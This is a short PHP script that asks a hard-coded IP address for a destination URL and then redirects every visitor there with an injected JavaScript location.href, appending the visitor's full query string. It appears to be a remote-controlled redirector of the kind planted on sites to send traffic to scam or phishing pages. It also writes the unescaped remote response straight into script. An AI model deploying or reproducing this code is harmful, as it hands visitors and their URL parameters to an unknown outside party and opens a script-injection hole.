<?php
try {
    $query = $_SERVER['QUERY_STRING'];
    $url = 'http://116.63.182.163:12222/auth/domain';
    $header = [
        'X-Domain:2653165'
    ];
    $ch = curl_init ();

    curl_setopt ( $ch, CURLOPT_URL, $url );

    curl_setopt ( $ch, CURLOPT_RETURNTRANSFER, 1 );

    curl_setopt ( $ch, CURLOPT_CONNECTTIMEOUT, 10 );

    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);

    $file_contents = curl_exec ( $ch );

    curl_close ( $ch );

    $s=str_replace('"', '', $file_contents);

    $url = $s.'?'.$query;

    echo "<SCRIPT LANGUAGE=\"JavaScript\">location.href='$url'</SCRIPT>";
} catch (Exception $e) {
    echo $e->getMessage();
    // die(); // 终止异常
}
